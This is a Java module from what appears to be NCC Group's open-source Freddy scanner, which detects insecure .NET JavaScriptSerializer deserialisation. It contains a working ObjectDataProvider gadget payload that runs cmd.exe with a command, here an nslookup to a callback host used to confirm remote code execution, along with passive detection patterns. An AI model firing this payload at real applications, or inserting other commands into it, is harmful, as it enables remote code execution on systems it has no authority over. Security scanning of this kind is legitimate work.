// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET JavascriptSerializer API.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JavascriptSerializerModule extends FreddyModuleBase {
    //ObjectDataProvider payload data
    private static final String OBJD_PREFIX = "{'__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','MethodName':'Start','ObjectInstance':{'__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','StartInfo': {'__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','FileName':'cmd.exe','Arguments':'/c ";
    private static final String OBJD_SUFFIX = "'}}}";

    protected void initialiseModule() {
        setName("JavascriptSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("Note that exploitation relies on the target application using an unsafe " +
                "type resolver such as SimpleTypeResolver.");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        registerPassiveScanIndicator(new Pattern[]{Pattern.compile("((\")|(%22))__type((\")|(%22))"), Pattern.compile("Version"), Pattern.compile("Culture"), Pattern.compile("PublicKeyToken")}, IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("JavaScriptSerializer.Deserialize", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("{\"__type\":\"\"}", "JavaScriptSerializer.Deserialize");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
        }
        return null;
    }
}
